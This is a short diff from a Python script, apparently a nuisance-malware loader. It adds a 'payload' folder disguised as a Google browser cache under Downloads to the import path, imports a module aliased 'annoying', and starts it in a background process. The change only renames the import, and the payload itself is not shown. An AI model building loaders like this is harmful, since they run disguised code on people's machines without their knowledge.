@@ -6,7 +6,7 @@ payload_path = f"{home_dir}\\Downloads\\Google_Stable_x64\\assets\\cache"
 sys.path.insert(1, payload_path)
 
 # annoying = importlib.import_module(os.path.join(payload_path, "youtube_com.py"))
-import youtube as annoying
+import youtube_com as annoying
 
 annoying_func_thread = Process(target=annoying.start)
 annoying_func_thread.start()
